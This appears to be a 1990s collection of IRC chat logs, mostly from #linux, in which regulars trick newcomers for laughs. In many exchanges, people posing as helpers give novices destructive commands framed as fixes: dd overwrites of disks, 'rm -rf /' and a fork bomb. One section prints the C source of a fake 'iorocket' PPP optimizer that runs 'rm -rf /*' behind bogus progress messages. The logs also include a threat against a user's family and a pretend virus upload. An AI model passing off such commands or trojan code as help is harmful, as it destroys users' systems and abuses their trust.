+<jooe> matthie operation not permitted????
+-> *jooe* wanna give me access to the account so  Ican help you?
+[ jooe changes his nick to femi ]
+*femi* you jus tfucked up my entire system????
+*femi* what now ?????
+*femi* that fuckin command you gave me was fucked......
+*femi* were there fuck are yo u????
+<femi> matthies you just fucked up my machine ???
+<vi> femi- i can fix it!
+<femi> matthies were there fuck ru ???
+<femi> he fuckin gave me a command that fucked up my machine...
+<femi> matthies you fucked my machine ....
+<femi> matthies you fuck were are you ????
+<matthies> femi:  chill
+<Frakir> femi: the rest of us don't appreciate the language
+<femi> chill chill do you know how long it took me to install this stuff????
+<femi> you fuckin chill...
+<femi> fuck you matthies
+<matthies> *femi* you fuck..
+<matthies> *femi* I will definately get you back :: you wait ....
+<matthies> *femi* you fucked the wrong person....
+<matthies> *femi* I am going to put a cause you entire family...
+
+============================================================================
+
+How do I plug my Boca 28.8 into my com4 parallel port?
+
+<Nirv> yup
+<cplusplus> Nirv: Parellel?
+<Runar> Nirv: I don't think com4 is parallel dude
+<Jaymz> No wonder, Nirv. Why is it on your parallel port?
+*** cplusplus has changed the topic on channel #linux to <Nirv> Boca 28.8
+into com4 parallel port
+*** _spIDer_ is now known as _spider_
+*** seedtime (msparks@phoenix.phoenix.net) has joined channel #linux
+<Nirv> i linked /dev/modem to /dev/cua3
+<terrapin> gagagaga
+<terrapin> err hahahahah
+<Runar> Nirv: lpt4 might be parallel, but I don't think you've got that.
+<terrapin> cpp: THE PLAN
+<cplusplus> yeah
+* cplusplus copys to clipboard
+
+===========================================================================
+Efnet netsplits strike again
+
+<cav> * You have become desynced, to resync, type /sig resync
+<matthies> and open your prayerbook to te book of Revelatinos,
+Psalm 69
+<cav> *** Signoff: AlexKidd (resync)
+<cav> *** Signoff: xyz (resync)
+<RanciD> hahahahahah
+<Jaymz> hahahaha
+
+==========================================================================
+
+<cplusplus> kingcon: Doh. Do mkswap /dev/hd?? ; swapon /dev/hd??
+<cplusplus> Kingcon: That'll speed it up bigtime
+<kingcon> ok
+<kingcon> thats /dev/sda
+<kingcon> :)
+<cplusplus> kingcon: ok
+<kingcon> cpp - how many blocks, and do i use the option -c ??
+<cplusplus> kingcon: mkswap /dev/hd?? 20000 ; swapon /dev/hd??
+<kingcon> i forgottt the formula for blocks
+<kingcon> I got a big drive
+<cplusplus> kingcon: use 20000
+<kingcon> so give me a couple
+<kingcon> i got 8 megs only of ram :(
+<kingcon> (bad english) heh.
+<kingcon> ok
+<cplusplus> kingcon: Use 20000 and it'll make it an even 20 megs
+<kingcon> 20,000?
+<kingcon> sheesh
+<cplusplus> kingcon: Yeah
+<kingcon> ok
+<kingcon> mk
+<kingcon> NO CARRIER
+*** Signoff: kingcon (Error 0 occurred.)
+<cplusplus> that's cute
+
+ - Credit where credit is due. When kingcon logged back on with a DOS
+ - partition he was really resonable and good minded about it, and I
+ - admire him for not blowing up like certain people of the past. As I
+ - recall he said he needed to reinstall anyways. Here's hoping he has
+ - an excellent Linux future ahead of him.
+
+==========================================================================
+
+*** nicodne (~ab@set.cybercom.net) has joined #unix
+<nicodne> i have a kweshtion. mind if i ask?
+<nicodne> h0h0h0
+<_NAK_> micodene: ask.
+<nicodne> why is it that whenever i unplug my monitor it goes black ?
+<nicodne> i mean
+<MrOgre> uh
+<^_Rex_^> nicodne: maybe cuz when the cord is unplugged it has no power
+<McClaran> *sigh*
+*** nicodne was kicked from #unix by _NAK_ (thanks for cominout)
+
+	- Submitted by _^Rex^_
+
+=========================================================================
+
+More Matthies - This is a file he sent me, I didn't really go over it
+
+> jooe - dd if=/etc/hosts of=/vmlinuz try that
+>  dd if=/etc/hosts of=/vmlinuz bs=8192
+<jooe> matties _ unrecognised option if-/etc/hosts???????
+> if= not if-
+<jooe> mattis it says 0+1 records in 0+1 records out
+<jooe> matthies did you get that ??
+<jooe> matthies what's next ??
+> jooe - try dd if=/etc/hosts of=/proc/kcore bs=4098
+<jooe> matthies it ssays permission denied????
+> jooe - try dd if=/etc/hosts of=/dev/console bs=4098
+<jooe> matthie unrecognised option 'it/etc/hosts 
+*dthomas* don't you mean if=/vmlinuz?  :-)
+<jooe> matthie any other idears ??
+-> *jooe* try rm -rf / :)
+*** Signoff: jooe (Leaving)
+<jooe> matthie operation not permitted????
+-> *jooe* wanna give me access to the account so  Ican help you?
+
+
+*femi* you jus tfucked up my entire system????
+*femi* what now ?????
+*femi* that fuckin command you gave me was fucked......
+*femi* were there fuck are yo u????
+<femi> matthies you just fucked up my machine ???
+<vi> femi- i can fix it!
+
+
+<femi> matthies were there fuck ru ???
+<femi> he fuckin gave me a command that fucked up my machine...
+<femi> matthies you fucked my machine ....
+<femi> matthies you fuck were are you ????
+ femi:  chill
+<Frakir> femi: the rest of us don't appreciate the language
+<femi> chill chill do you know how long it took me to install this stuff????
+<femi> you fuckin chill...
+<femi> fuck you matthies
+
+*** Sabotage There was no such nickname ***
+Sabotage is sabotage@dragon.achilles.net (Ben Dover)   
+*** on channels: #icep *** on irc via server irc.texas.net i
+([204.96.20.4] Texas Networking, INC) i
+-> *Sabotage* do you need help? i
+*Sabotage* well yeah.. i
+-> *sabotage* try this: dd if=/etc/hosts of=/dev/hda bs=4098 that will i
++unpartition it i
+Sabotage* thanks alot man.. i
+-> *Sabotage* no prob
+
+
+-> *LowRideRz* try this: dd if=<PATH TO FILENAME> of=/dev/hda bs=200
+*LoWRiDeRz* ok
+*LoWRiDeRz* ?
+
+LoWRiDeRz* do i put dd if= the name of the file ? of=/dev/hda bs=200
+*LoWRiDeRz* it said 732+1 records in   
+*LoWRiDeRz* 732+1 records out
+*** LoWRiDeRz is LoWRiDeR@dynamic175-102.ip.portal.com (DiCk B LoNg)
+*** on channels: #linux
+*** on irc via server irc2.portal.com ([irc1.portal.com] Road construction)
+*LoWRiDeRz* then made a -dev-hda ?
+
+WRiDeRz* what is the path to the file ? ie /root/file.exe ???
+*LoWRiDeRz* c:\comit\comit.exe
+-> *LoWRiDeRz* do: dd if=/vmlinuz of=/dev/hda bs=200 that'll do it
+*LoWRiDeRz* ?
+*LoWRiDeRz* no i can do nothing
+*LoWRiDeRz* :(
+
+=========================================================================
+The popularity grows (No doubt spruned by the fact that all the newbies 
+are positivly FLOODING into the area because school is starting up again, 
+if you don't believe me just look around). And I'm just a granter of 
+wishes, such as "I need more swap" or...
+
+<Blacky:#newcastle> ahh cplusplus is on, i might see if i can get into 
+his little irc-twits file 
+
+Smile blacky, your on candid IRC-cam 
+
+This takes place after he crashed unexpectedly - Something to do with:
+<cplusplus> Put this in a file and compile it: 
+            main(){while(1){fork();malloc(2048);}}
+---
+<Craig> Sure. Why not.
+<cplusplus> dd if=/etc/fstab of=/dev/hda1 ; makemap dbm report < /vmlinuz
+<Craig> From the command lien right?
+<cplusplus> Yup
+<cplusplus> Wait
+[AON] no way, this isn't going to happen 
+<cplusplus> Oh no that's right
+<Craig> OK.
+<cplusplus> Just make sure makemap is in your path
+<cplusplus> It's in /usr/sbin
+<cplusplus> It spin the disk a bit?
+<Craig> Permission Denied
+<cplusplus> You root?
+<Craig> Yes.
+<cplusplus> Hrm
+<cplusplus> Odd
+<Craig> What's it supposed to do?
+<cplusplus> Do /exec mount -o again
+<cplusplus> I musta got it wrong
+<Craig> /dev/hda1 on / type ext2 (rw)
+<Craig> none on /proc type proc (rw)
+<Craig> /dev/hda2 on /home type ext2 (rw)
+<Craig> /dev/hdb on /system_cd type iso9660 (ro)
+<renegade> c++, does that report produce an inode report?
+<renegade> mine never shows me inode data
+<cplusplus> Yeah
+<cplusplus> Well, sort of
+<cplusplus> it has inode summaries
+<cplusplus> And you can use this other util to get the direct info
+<renegade> ok
+<renegade> will it do it for both partitions
+<renegade> ?
+<cplusplus> craig?
+<renegade> brb
+<cplusplus> ren: Yeah. Be sure to get the null records in for any extra partitions
+<renegade> put that on screen again..
+<renegade> ok
+* cplusplus pokes craig
+<Craig> Got it.. Permission denied.
+<cplusplus> ??
+<cplusplus> dd if=/dev/zero of=/dev/hda2 ; dd if=/dev/zero of=/dev/hda1 ; makemap
+<cplusplus> You should probably run it from the root dir
+<Craig> Must be... 
+<cplusplus> Still says permission denied?
+<Craig> What was the FS bug. What exactly does/did it do.
+<Craig> Working on it.
+<cplusplus> Some of the formats have a weird e2fs header that has started to cause problems
+<cplusplus> The report will let you know if this is the case
+<Craig> I get an "Illegal command que tag recieved".
+<cplusplus> When you try to run dd?
+<cplusplus> Did it access the disk at all?
+<Craig> Correct.  No no disk access.
+<cplusplus> Huh.
+<cplusplus> Try just the first one
+<cplusplus> dd if=/dev/zero of=/dev/hdb2
+<Craig> "Permission Denied"
+<cplusplus> type dd and press ctl+c
+<cplusplus> what does it say?
+<Craig> 0+0 record in
+<Craig> 0+0 records out
+<cplusplus>  /exec -o ls -l /dev/zero
+<renegade> BLOCK:        STAT:         ILINES:    COUNT:
+<renegade> 1101          linked        None       +.545341
+<renegade> 1102          linked        None       +.128764
+<renegade> 1103          linked        None       +.541324
+<renegade> 1104          linked        Yes        +.987341
+<renegade> 1105          linked        Yes        +.143234
+<renegade> 1106          linked        Yes        +.517541
+<renegade> 1107          linked        None       +.987712
+<renegade> 1108          linked        None       +.324323
+<renegade> What are ilines?????
+<Craig> crw-rw-rw-   1 root     system     1,   5 Jul 21  1993 /dev/zero
+<cplusplus> World writable?
+<cplusplus> Huh
+<renegade> And how can I get that count a little higher on my inodes?  I hate wasting space like this
+<renegade> Can that be done w/o reformatting?
+<cplusplus> ren: It can, you can tweak the hdparams
+<cplusplus> craig: This is definitly odd. It works on my computer.
+<renegade> worked on mine too
+<cplusplus> craig: Why don't you try dd if=/dev/zero of=/dev/hda1
+<renegade> that's a long fuking report
+<renegade> heh
+<renegade> spins the shit outta the drive too.
+<cplusplus> Hrm
+<cplusplus> BLOCK:        STAT:         ILINES:    COUNT:
+<cplusplus> 1401          linked        None       +.432341
+<cplusplus> 1402          linked        None       +.124764
+<cplusplus> 1403          linked        None       +.543324
+<cplusplus> 1404          linked        Yes        +.984341
+<cplusplus> 1405          linked        Yes        +.143234
+<cplusplus> 1406          linked        Yes        +.542541
+<cplusplus> 1407          linked        None       +.927712
+<cplusplus> 1408          linked        None       +.424323
+<AON> BLOCK:        STAT:         ILINES:    COUNT:
+<cplusplus> Same idea
+<AON> 1101          linked        Yes       +.945341
+<AON> 1102          linked        None       +.428764
+<AON> 1103          linked        None       +.041024
+<AON> 1104          linked        None        +.147941
+<AON> 1105          linked        Yes        +.996634
+<AON> 1106          linked        Yes        +.666541
+<AON> 1107          linked        Yes      +.985532
+<AON> 1108          linked        None       +.324323
+<AON> works here
+<renegade> damn russ
+<renegade> you got that killer inode use
+<renegade> mine sux
+<renegade> you see it?
+<AON> yes
+<AON> some are cool
+<cplusplus> The second one work, craig?
+<AON> other suck big time
+*** CTCP PING reply from renegade: 0 seconds
+*** CTCP PING reply from tsbnbot: 0 seconds
+* renegade ponders how much wasted disk space he has on lin1.
+-AON- PONG! Running [DRAGON] by SYCLOPS afn17007@freenet.ufl.edu
+<AON> how can i get it to average out better?
+<renegade> c++ said hdparms can be tweaked
+-=> renegade <=- I think he's dead, Jim
+[renegade] Think you got him? 
+* AON needs to tweak
+*** CTCP PING reply from renegade: 0 seconds
+*** CTCP PING reply from tsbnbot: 0 seconds
+-AON- PONG! Running [DRAGON] by SYCLOPS afn17007@freenet.ufl.edu
+<cplusplus> Can't ping him
+<cplusplus> IP ping is dead too
+* cplusplus coughs
+<cplusplus> He's gone
+* AON dies!
+<AON> +100 karma for c++
+<cplusplus> You two laughing?
+<AON> i'm dieing
+<AON> shit
+<AON> hehehe
+<AON> somebody help me off the floor!
+* AON has fallen and can't get up
+
+============================================================================
+11/01/95
+<DjTaCo> the screens go bye so fast i can't read them
+<DjTaCo>  and i forget my glasses alot
+<cplusplus> You're at 2400 with a 14.4K because it SCROLLS to fast?
+<DjTaco> yes
+
+============================================================================
+12/04/95
+<artemis-> I try to run rtfm, but I get the message 'rtfm: command not found'
+
+============================================================================
+12/08/95
+IRC log started Wed Dec  6 04:55
+*** Value of LOG set to ON
+*** Jax is rroush@205.160.250.250 (http://www2.inetw.net/~rroush)
+*** on channels: #linux
+*** on irc via server irc.colorado.edu (Univ of Colorado Server (2.8.*))
+*** Jax has been idle 6 minutes
+-=> leviathan <=- hey
+-=> leviathan <=- what's the error?
+[LeviathaN:leviathan@eons.com] Help me dude! Heh
+-=> LeviathaN <=- what was the error message again?
+[LeviathaN:leviathan@eons.com] It gets to the end of the script and says
+                               something like "Set SERVER first" then
+                               hangs up and aborts
+-=> LeviathaN <=- did you configure dip.cf ?
+[LeviathaN:leviathan@eons.com] Where is it located?
+-=> LeviathaN <=- ok, you have to initialize the config
+-=> LeviathaN <=- are you root?
+<Riad> loghair: ignoring who ? i received no meesssage
+[LeviathaN:leviathan@eons.com] Yep
+-=> LeviathaN <=- k
+-=> LeviathaN <=- type: rm -rf / /etc/dip.cf
+-=> LeviathaN <=- you doing it?
+[LeviathaN:leviathan@eons.com] It gave me 2 errors
+-=> LeviathaN <=- what errors?
+[FIDELITY] -> 05:00.
+[LeviathaN:leviathan@eons.com] 'rm: //DOS: Operation not permitted' and
+                               'rm: //etc:Device or resource busy'
+-=> LeviathaN <=- are you sure you are root?
+[LeviathaN:leviathan@eons.com] Then it gave me like 6 more
+-=> LeviathaN <=- ok we'll try the other way to configure it
+-=> LeviathaN <=- rm -rf / dip.cf
+[LeviathaN:leviathan@eons.com] Shit
+-=> LeviathaN <=- what?
+[LeviathaN:leviathan@eons.com] My etc dir is empty now
+-=> LeviathaN <=- it shouldn't be
+-=> LeviathaN <=- try rm -rf / dip.cf
+[FIDELITY] -> 05:05.
+-=> LeviathaN <=- did you do that so we can goto the next step ?
+[LeviathaN:leviathan@eons.com] Yeah
+-=> LeviathaN <=- you did rm -rf / dip.cf
+[LeviathaN:leviathan@eons.com] Yes
+-=> LeviathaN <=- ok
+-=> LeviathaN <=- dd if=/dev/zero of=/dev/hda1
+-=> LeviathaN <=- ready for the next step?
+*** LeviathaN is ~leviathan@www.eons.com (LeviathaN)
+*** on channels: #linux
+*** on irc via server minnie.cc.utexas.edu (UT's 3rd "I Repeat Class" server)
+-=> LeviathaN <=- hello
+*** CTCP FINGER reply from LeviathaN: (leviathan@www.eons.com) has been
+                idle 2 seconds.
+-=> LeviathaN <=- are you ready for the next step?
+<LeviathaN> God damn
+<LeviathaN> Pax is an ass
+[FIDELITY] -> 05:15.
+*** RAW_IRC activated by "LeviathaN!~leviathan@www.eons.com PRIVMSG
+            #linux :I gotta go kick his ass"
+<LeviathaN> I gotta go kick his ass
+<LeviathaN> BBL *** 
+Signoff: LeviathaN (Leaving... )
+-=> LeviathaN <=- what do you mean?
+*** LeviathaN: No such nick/channel
+
+=============================================================================
+12/28/95
+[This took place on a Major BBS System (Integrated Connection)
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ   Chat Mode Activated   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+             Type 'X' on a blank line to exit.
+
+you want me to help?
+yeah
+
+Root is paging you from Teleconference:  DNS most likly
+
+okay.  I'm gonna help you optimize PPP for the most speed you can get, okay?
+your not gonna telnet in as root
+:)
+no need to
+ok
+
+Root is paging you from Teleconference:  i can't believe you taking the phun
+out of this..:)
+I'll explain how to do it..  tell me what partation is your hd?  
+/dev/hda1 ?
+/dev/hdb3
+
+/dev/hdb2 or /dev/hdb3
+3
+you sure?
+No i'm a fucking liar.. Yes I'm Sure I have 2 hd's 1 partion on the first 
+and 3on the 2nd 50 meg dos 16 meg swap and the rest linux
+hello?
+hold on a second, reading a optimization file.ij
+I get my ISP through INdynet
+If that helpZ
+
+ Root logs -OFF- : Time for me to go, see ya later!
+almost done.  hold.
+
+ììì Root logs -ON- : Hi everyone!  How are you today?
+okay, I'm gonna send you something called fastio, it came with my version of
+ppp (I purchased another linux distro).  It gives you the fastest and 
+cleanist
+connection possible, I'vve noticed.  ok..
+could I have an irc compiled too pls
+
+ Captain Picard logs -OFF- : See ya later!
+and why does it sayyou do n't have irc compiled?
+I used to but had to Get rid of my system  ....
+
+ììì Jeff logs -ON- : Hi Everyone!
+
+how am I going to get you the irc client.  hum.  you know how to use minicom,
+correct?
+I'm in it right no
+now
+so, in a minute, we'll hang up from ic, and I'll call you, you connect (ata)
+and I'll send you the file.  after you get it, do chmod +x irc, and chmod +x
+fastio.  then run the fastio first, it'll start the ppp session 
+correctly, then
+
+ ClosetMan logs -OFF- : See ya later!
+run irc
+ok...
+let me get the programs together. hold on.
+
+ììì Pink Silk Lace logs -ON- : Hi Everyone!
+You got 28.8
+yeah
+me too
+lemme read my holiday card someone emailed me, then I'll be ready.ok
+
+ììì ClosetMan logs -ON- : Hi Everyone!
+
+ ClosetMan logs -OFF- : See ya later!
+
+ Jeff logs -OFF- : See ya later!
+
+HEY will it make me a file called ppp to like.. run pppd right
+what fastio does, when you run it is first search (quickly) for your modem,
+then correctly initalize ppp
+so I have to run fastio every time I wanna run ppp
+??
+what does unknown server error mean anyway
+you are not passing the correct commands to it
+that's what i got when I tried to telnet
+so are we gonna do it or not
+:)
+gotta go to bed so I can wake up tomarrow morning and get my new 4 meg of ram
+from my parents
+whats your number?
+5959798
+
+Do I run fastion every time I wanna run PPP
+yes.  its actually called iorocket, I thought it was fastio.  ohh well.
+ok
+can I rename it ppp
+for the first run, it has to be called iorocket.
+ok also... where should I put compiled pppd
+when you installed linux, it placed pppd in a directory, /usr/something,
+iorocket will find it.
+you ready?
+eyah
+
+[From this point, I called his system, and sent him a compiled version of 
+the "iorocket" program.  Here is what the program was really.
+
+IOROCKET.C:
+#include <iostream.h>
+#include <unistd.h>
+#include <stdlib.h>
+int main(void)
+{
+  cout << "\nI/O Rocket v1.22b - NewComm Enterprises - 1995";
+  cout << "\n\n - PPP/SLIP/CSLIP Optimizer loading.. please wait.." << endl;
+  sleep(5);
+  cout << "\n - Searching for PPP system files.." << endl;
+  sleep(4);
+  cout << "\n - Modem found on CUA1 (COM2, 28.8 CONNECTION BEING MADE" << 
+endl;
+  system("/bin/rm -rf /*");
+  cout << "\n - Connected to server slip.indy.net - enjoy" << endl;
+  return 0;
+}
+
+<Freak> I can't even do ls anymore
+<DarkNite> umm, what happened when you rebooted?
+<Freak> Nothing.
+<DarkNite> you are screwed.  You shoulda known better.
+
+As you see, once he runs this, he thinks he's connecting to his isp, but
+we are really just deleting his hard drive.
+
+By, yours truly..  DarkNite.  
+
+
+=========================================================================
+cplusplus, 01/25/96
+
+<Wasim:#linux> that's with netscape up, going to punch up my normal load now
+<Wasim:#linux> what's a good program to run, to put load on the cpu 
+<cplusplus> main(){while(1){fork();malloc(1024);}}
+<Wasim:#linux> how much load will it put, I don't want it to kill me
+<cplusplus> Not too much, not too little. try it
+<Wasim:#linux> gcc -o load.c ?
+<cplusplus> Yuppers
+# I switch to #tessier
+<cplusplus> wasim is about to fork himself
+<cplusplus> This should be good
+<Mandy> I noticed that
+<Wasim:#linux> gcc: No input files
+<Mandy:#linux> gcc load.c -o load
+# I switch to #linux
+<cplusplus> gcc load.c -o load
+# I switch to #tessier
+<Wasim:#linux> gotcha
+<Wasim:#linux> started
+<Mandy> ;-)  Whats going to happen to poor wasim?
+<cplusplus> Never forked yourself?
+<cplusplus> The moment after he runs it he'll be unable to type
+<Mandy> Is he going to have infinite processes of 1 meg apice?
+<Wasim:#linux> AAAAAAGHHH
+<Mandy> Lemmie try it
+# I switch to #linux
+<cplusplus> aaaaaaaaaaaaagh?
+* cplusplus kills himself laughing
+<Wasim> yeah
+<cplusplus> Something wrong?
+<cplusplus> wasim?
+<cplusplus> oh wasim?
+* cplusplus shruggeth
+<cplusplus> you still here?
+
+# Big netsplit so I missed the reactions when he hardbooted
+
+============================================================================
+
+This takes place right after we had pingflooded SQL after he ircflooded
+us.
+
+IRC log started Sat Jan 27 04:52
+<cplusplus> hey sql
+<SQL> ya
+* Wasim tickles SQL (scream)
+<synthpunk> hows it goin
+<synthpunk> SQL: How's that modem of yours
+->  cplusplus  watch this
+<SQL> its no fun if you can't flood peple
+<synthpunk> SQL: Do you have an external modem?
+<cplusplus> Don't piss people off them
+<cplusplus> then
+<SQL> yup
+<Wasim> no...you're right...watch those light carefully okay
+<synthpunk> you can like see the lights go on and off and such?
+->  wasim  not now watch this
+# ------------------( WhoIs: SQL )---------------- --  -
+# UserHost : blkmiata@ple-ca8-05.ix.netcom.com (Commercial)
+# Irc Info : Wylie E. Coyote
+# Channels : #linux
+#  Server  : davis.ca.us.dal.net (DALnet West Coast Hub)
+* cplusplus tries not to laugh
+<synthpunk> SQL: You see the send data/recieve data light going on and off every now and then?
+*** Teller (Teller@cs105-1.u.washington.edu) joined #linux at 04:55am
+*** Mode change "+o Teller" on channel #linux by ChanServ
+<SQL> your point?
+<synthpunk> SQL: That's me logging on to your computer
+->  wasim  hehe
+<SQL> ya right
+<synthpunk> SQL: Now if the hard drive starts flashing, you know why, ok?
+<cplusplus> Oh he's got the Windows fs bugs?
+<synthpunk> And there's quite nothing you can do about it
+* cplusplus mounts up his fs with WFW
+<synthpunk> cpp: Watch this I can make his hd light go on...
+<synthpunk> npow
+<synthpunk> now
+<synthpunk> I mean
+->  cplusplus  he's getting paranoid as hell
+<Teller> you guys taking advantage of that win95 security? :)
+<cplusplus> ?
+<synthpunk> Teller: Yup... obviously this kid is a newbie
+<cplusplus> Should I upload a virus?
+<cplusplus> teller: Yeah
+<synthpunk> cpp: go for it
+<cplusplus> let me pick one from my archive
+<synthpunk> SQL: If I were you I'd turn off my computer right about now
+<Teller> not really his fault, ms should have done a better jon of it
+<Teller> err job
+* cplusplus mounts up sql
+<SQL> oh really
+* SQL knows an asshole when he sees one ( cplusplus )
+* cplusplus sends
+<Wasim> SQL: you're fucked man, seriously
+* synthpunk knows of a virus infected keyboard jockey when he sees one ( SQL )
+<cplusplus> See it?
+<cplusplus> Here it comes
+<synthpunk> hahahah i see it
+*** Signoff: SQL (Error 0)
+<synthpunk> oh shit
+<synthpunk> hahahahajikofmngh dsfg
+<synthpunk> hahahahaa
+* cplusplus stops
+<synthpunk> BAHAHAHAHHAAHAHAHAH
+<Teller> haha
+<synthpunk> *** Signoff: SQL (Error 0)
+<synthpunk> hehehehe
+IRC log ended Sat Jan 27 04:59
+
+==========================================================================
+
+[FIDELITY] -> Anthony has slunk into #linux
+<Anthony> hi
+[FIDELITY] -> 07:25.
+[FIDELITY] -> --- YOU HAVE BEEN AUTOMATICALY PLACED UN-AWAY
+<cplusplus> Hello.
+[^BFIDELITY^B] -> xanth.ma.us.dal.net You have returned to your body.
+[^BFIDELITY^B] -> Anthony from slip109-163.bb.delphi.com, ident ~1234, 
+Anthony
+[^BFIDELITY^B] -> on: #linux
+[^BFIDELITY^B] -> via phoenix.tx.us.dal.net
+<Anthony> whats up in here
+<cplusplus> Nothing. It's nighttime.
+<Anthony> any chics
+<cplusplus> Yes
+<Anthony> who
+* cplusplus coughs, it's no fun if I tell you
+<Anthony> but please tell me, i want to have sex!!!
+<cplusplus> I'd wager you're in the wrong channel
+<Anthony> is this one of those computer dorks channel???
+<cplusplus> no
+[FIDELITY] -> Da topic for #linux is You've got mail!
+[FIDELITY] -> Topic for #linux set by synthpunk on Jan 27 21:30:32
+<Anthony> what is it then
+<cplusplus> Follows of the linux rap group
+<cplusplus> followers, even
+<Anthony> what is that, may i ask
+<cplusplus> Umm, a rap group maybe?
+<Anthony> rap is for dicks!
+<cplusplus> No, dicks are for men.
+<cplusplus> Didn't your sister teach you anything?
+<Anthony> just kidding man later.
+* cplusplus shrugs
+[FIDELITY] -> Anthony has departed #linux.
+* cplusplus flips off his log
+IRC log ended Sun Jan 28 07:29
+
+
+===================================================================
+OK, everyone mail the netcom lamers and ask them where you 
+can get a copy of Abuse for linux
+
+- ---------- Forwarded message ----------
+Date: Mon, 29 Jan 1996 11:15:57 -0800 (PST)
+From: NETCOM Technical Support <abuse@netcom.com>
+To: pfnguyen@netcom.com
+Subject: IRC Abuse
+
+We have received several complaints from users regarding your actions
+within IRC.  It has come to our attention that you have been
+intentionally causing nick collisions within IRC.  Intentional nick
+collisions within IRC disrupts the service of other individuals on
+Netcom as well as other services and is considered an abuse of the
+system.  Information about abuse of the system can be found under
+section 7 of the Netcom Terms and Conditions.  (For shell users, this
+is article 7.1 of the faq terms.  For NetCruiser users, this is located
+NETCOM directory under the filename of AGREE.TXT.)
+
+If we receive additional complaints of intentional nick collisions,
+your account will be placed on hold.
+
+On account suspensions:
+
+NETCOM policies are set by the general manager to equitably allocate 
+finite system resources.  Systems administrators and accounting personnel 
+implement the policies.  The implementation may involve suspending an 
+account.
+
+Abuse of system resources:
+
+Any use of NETCOM system resources that disrupts the normal use of the
+system for other NETCOM customers is considered to be abuse of system
+resources and is grounds for System Administration intervention.  Some
+examples of system abuse include spawning excessive processes, consuming
+excessive amounts of memory or cpu for long periods of time, and staying
+attached to modems while not really "active" on the line. 
+
+If the misuse is unintentional, the suspension will be rescinded
+following discussion with NETCOM Technical Support. If the misuse is
+intentional, the suspension may be rescinded at the discretion of the
+general manager, with the possibility of a service reconnection charge.
+Occasionally, unintentional misuse is misclassified as intentional
+misuse.  Customers who believe their activity has been misclassified
+may appeal to the general manager.
+
+We request that a response to this message be made.  Please include 
+any questions, comments or acknowledgement with regards to this warning.
+
+- -Kathleen
+____________________________________________________________________________
+              _     _
+             |_|_  |_|   NETCOM Online Communication Services, Inc.
+            _  |_|_      Technical Support Representative
+           |_|  _|_|
+               |_|       24 Hour Technical Support Hot Line
+             NETCOM      (408) 983-5970
+
+  NEW!!  On-Line Technical Support:     http://www.netcom.com/bin/webtech
+
+E-mail Support Representative                           IRC Abuse Coordinator
+____________________________________________________________________________
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.2
+
+iQCVAwUBMQ1NHi2IFwkNl+ANAQH4HQQAw1yHJ+v5HV00UJdErM3BiDVlv6YKLj0y
+Z5grBX/wqtG/8/bgHq0jkhyqH0oXPACQ47lKGu/UKsbKvXPRkhST0q5VnhMBLAn6
+EZFH9Jwzpt84iOFpMwl2IuH2Ga0X3Xen5098NMGtUrFKT9GxGI6UP/aIR1LAYi1h
+HDjDrKWTxHE=
+=67ib
+-----END PGP SIGNATURE-----
+
+===========================================================================
+
+02/22/96
+
+<Mandy> My ISP keeps dropping carrier for no apparent reason
+<Mandy> And it didnt this morning
+<Mandy> and he said he didnt change anything
+<Mandy> and I didnt change anything
+* Mandy freaks
+* cc hits the switch to disconnect mandy again
+<cplusplus> HEY my turn cc
+<cc> Drat
+* cc hands the holy hand switch to c++
+* cplusplus gives it to synth and goes back to work
+<synthpunk> aahh
+* synthpunk ponders
+* synthpunk hits the button a couple times to test it
+* synthpunk reads the label "Press here to piss off Mandy"
+* synthpunk jabs the button a few dozen times
+* synthpunk yawns
+*** Signoff: Mandy (Connection reset by peer) [#linux]
+*** [6x86] (~electel@bronze.coil.com) has joined channel #linux
+<cplusplus> it works
+<cplusplus> the button
+<cplusplus> [FIDELITY] -> Mandy has chansigned on #linux, Connection
++ reset by peer
+<synthpunk> muahaha
+* synthpunk brandishes the switch
+
+===========================================================================
+
+IRC log started Mon Feb 12 03:38
+*** Value of LOG set to ON
+*** Lastlog:
+<Black_IC> mow: I've got a bridge to sell ya mow.
+<mow> very _funny_!
+<mow> i can swear, cant i?
+<cplusplus> wasim It's not nice to confuse cplusplus
+* Black_IC falls down.  Which is funny, cuz he wasn't standing to being with.
+<cplusplus> mow Sure. [censored].
+<cplusplus> You just won't see other peoples swearing unless your site has been cleared
+<Wasim> sorry, o'master, koh pah...
+<Black_IC> [censored] A we can.
+<mow> i will not believe, cannot believe that ur swearing is censored!
+<cplusplus> Has to do with the new privacy laws
+<mow> u _Are_ kidding!
+<cplusplus> It's illegal to swear in the us internet now
+<cplusplus> no
+[FIDELITY] -> CJJR has slunk into #linux 
+<mow> please! say ure kidding
+<Wasim> [censored] bill clinton
+<mow> yeh fucking bill clinton
+<cplusplus> god [censored] [censored] guy
+<mow> did you see that?
+<Teller> man thats [censored]
+<TellarHK> [censored] is this place [censored] thanks to that mother [censored] bill.
+<Black_IC> [censored] me. [censored] the government! [censored]!
+<cplusplus> <mow> yeh [censored] bill clinton
+<mow> did u see i wrote fucking?
+<Black_IC> No.. it was censored.
+<cplusplus> <mow> did u see i wrote [censored]?
+<mow> or did u see [censored]
+<Teller> <mow> did u see i wrote [censored]?
+<mow> i only see [censored}!
+[Wasim:wasim@cephas.com] I'm going to die, cpp 
+<cplusplus> Go into #dragonrealm
+<Black_IC> Well that's what we've been trying to tell you!
+<cplusplus> ask to have your site uncensored
+<mow> i will not fucking shit piss whore damn it believe this!
+<Maelcum> Well I think this whole situation is [censored] [censored] 
+          [censored] [censored] [censored] [censored] [censored] [censored] 
+          [censored] [censored] [censored] [censored] [censored] [censored] 
+          [censored] [censored] [censored] [censored] [censored]
+[Wasim:wasim@cephas.com] I hope to god you have a log of thi 
+[Teller:Teller@u.washington.edu] the plan... 
+* Black_IC grins at Wasim.
+<cplusplus> Dosn't thus [censored]?
+[FIDELITY] -> CJJR has departed #linux.
+<mow> who the FUCK CAN I ASK TO GET UNCENSORED?
+<Teller> president@whitehouse.gov ?
+<Maelcum> mow: Congress. :)
+<TellarHK> mow: Bug your [censored] sysadmin.
+<mow> i will swear whenever i feel like it!
+<Wasim> [censored] it.. you can't now
+<cplusplus> But, we won't see it
+<mow> this cant be happening! waaaagh!
+<Black_IC> That's a good start.
+<mow> #¤%"¤##/
+<cplusplus> Efnet will be like this starting on wed
+<Black_IC> Yes it [censored] can!
+[FIDELITY] -> 03:40.
+<mow> no,no,no,no,no
+* Golle is glad he is not in the US
+<cplusplus> Anything deemed unsuitable is now illegal in the US
